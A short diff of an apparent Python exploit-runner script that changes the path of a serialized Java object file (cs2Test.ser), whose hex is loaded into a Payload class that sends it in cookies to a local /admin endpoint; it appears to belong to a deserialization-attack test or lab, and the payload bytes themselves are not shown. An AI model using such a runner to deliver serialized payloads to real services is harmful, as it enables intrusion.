@@ -29,6 +29,6 @@ class Payload(payload_model):
         return request("get", "http://127.0.0.1:8080/admin", cookies=cookies)
 
 if __name__ == "__main__":
-    exp = open("cs2Test.ser", "rb").read()
+    exp = open("/application/source/code/java/demo/src/main/resources/serialize/cs2Test.ser", "rb").read()
     payload = Payload(bytes.hex(exp), fake=True)
     payload.run()
